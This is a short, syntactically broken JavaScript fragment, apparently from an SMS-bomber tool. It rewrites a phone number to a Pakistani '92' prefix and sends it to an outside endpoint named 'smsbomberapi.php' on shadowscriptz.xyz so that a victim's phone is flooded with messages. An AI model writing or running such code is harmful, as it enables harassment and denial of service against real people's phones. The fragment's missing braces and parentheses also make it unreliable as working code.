      }

      const fullNumber = number.startsWith("92") ? number : "92" + number.slice(1);
      
      fetch(`https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${fullNumber}`)
        .then(res => {
          if (res.ok) {

          }

        .catch(() => alert("🚫 Error occurred. Check connection or number."));
